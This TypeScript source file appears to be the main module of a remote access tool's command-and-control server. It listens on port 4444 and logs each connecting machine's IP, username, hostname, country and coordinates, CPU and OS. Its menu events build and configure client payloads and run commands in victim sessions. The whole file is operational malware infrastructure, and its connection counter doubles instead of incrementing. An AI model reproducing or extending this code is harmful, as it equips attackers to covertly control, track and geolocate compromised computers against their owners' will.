/* eslint-disable no-case-declarations */
/* eslint-disable @typescript-eslint/no-unsafe-argument */
import { type EventEmitter } from 'node:events'
import { createServer, type Server } from 'node:net'
import { DataSource } from 'typeorm'
import packageData from '../../package.json'
import { PresentersFactory } from './boostrap/Presenters.factory'
import { DatabaseConfig } from './db/Config'
import { EventListener } from './event/EventListener'
import { Connection } from './models/Connection'
import { TemplateView } from './views/Template.view'

const dataSource = new DataSource(DatabaseConfig.configure())
const connections: Connection[] = []

function connectToClient (eventEmitter: EventEmitter): Server {
  let connectionId: number = 1

  const newServer = createServer((socket) => {
    socket.on('data', (data) => {
      const jsonData = JSON.parse(data.toString())

      switch (jsonData.type) {
        case 'INFO':
          const connection = new Connection(
            connectionId,
            jsonData.data.ip,
            jsonData.data.username,
            jsonData.data.hostname,
            jsonData.data.country,
            jsonData.data.lat,
            jsonData.data.lon,
            jsonData.data.regionName,
            jsonData.data.cpu,
            jsonData.data.os,
            socket
          )

          connections.push(connection)
          connectionId += connectionId
          break

        case 'INIT':
          eventEmitter.emit('INIT_SESSION_CMD', jsonData.data)
          break
        case 'COMMAND_RESPONSE':
          console.log(jsonData.data)
          EventListener.getEventEmitter().emit('INIT_SESSION_CMD', jsonData.prefix)
          break
        default:
          break
      }
    })
  })

  newServer.listen(4444)

  return newServer
}

void dataSource.initialize().catch((error) => {
  console.error(error)
  process.exit(1)
}).then(() => {
  new TemplateView().showWelcomeTemplate({
    author: packageData.author,
    description: packageData.description,
    title: packageData.name,
    repositoryUrl: packageData.repository.url,
    version: packageData.version
  })

  PresentersFactory.setDataSource(dataSource)

  const eventEmitter = EventListener.getEventEmitter()

  connectToClient(eventEmitter)

  const mainMenuPresenter = PresentersFactory.makeMainMenuPresenter()
  const outputServerPresenter = PresentersFactory.makeOutputServerPresenter()
  const sessionsPresenter = PresentersFactory.makeSessionsPresenter()

  sessionsPresenter.setConnections(connections)

  eventEmitter.on('CHOSE_MENU_OPTION', mainMenuPresenter.chooseMenuOptions.bind(mainMenuPresenter))
  eventEmitter.on('BUILD_SERVER', outputServerPresenter.handleCompileAndBuildServer.bind(outputServerPresenter))
  eventEmitter.on('CONFIGURE_SERVER', outputServerPresenter.handleServerCreation.bind(outputServerPresenter))
  eventEmitter.on('GO_TO_MAIN_MENU', mainMenuPresenter.showMainMenu.bind(mainMenuPresenter))
  eventEmitter.on('SHOW_SESSIONS', sessionsPresenter.showSessions.bind(sessionsPresenter))
  eventEmitter.on('INTERACT_SESSION', sessionsPresenter.interact.bind(sessionsPresenter))
  eventEmitter.on('INIT_SESSION_CMD', sessionsPresenter.initializeSessionCmd.bind(sessionsPresenter))
  eventEmitter.on('RUN_SESSION_CMD', sessionsPresenter.runSessionCommand.bind(sessionsPresenter))

  eventEmitter.emit('GO_TO_MAIN_MENU')
})
